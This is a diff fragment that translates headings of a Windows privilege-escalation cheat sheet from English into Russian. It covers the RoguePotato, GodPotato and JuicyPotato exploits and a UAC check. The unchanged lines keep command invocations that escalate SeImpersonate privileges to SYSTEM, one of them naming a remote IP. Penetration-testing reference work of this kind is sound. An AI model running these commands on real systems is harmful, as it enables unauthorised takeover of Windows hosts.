@@ -240,14 +240,14 @@ RoguePotato — повышение привилегий через SeImpersonate
 .\RoguePotato.exe -r <IP> -e "cmd.exe" -l 9999
 ```
 
-GodPotato — broadest OS support, ImpersonatePrivilege to SYSTEM
+GodPotato — самая широкая поддержка версий ОС, повышение от ImpersonatePrivilege до SYSTEM.
 
 ```
 # GodPotato (works on Windows Server 2012 → 2022, Win8 → Win11):
 .\GodPotato.exe -cmd "cmd /c whoami"
 ```
 
-JuicyPotato — original potato, requires CLSID for target OS
+JuicyPotato — исходный «potato»-эксплойт, требует CLSID, соответствующего целевой ОС.
 
 ```
 # JuicyPotato (Windows Server 2016 and earlier, Win10 < 1809):
@@ -255,7 +255,7 @@ JuicyPotato — original potato, requires CLSID for target OS
 # CLSID varies by OS — use https://github.com/ohpe/juicy-potato/tree/master/CLSID
 ```
 
-Enumerate UAC configuration level
+Перечисление текущего уровня конфигурации UAC.
 
 ```
 # Check UAC level:
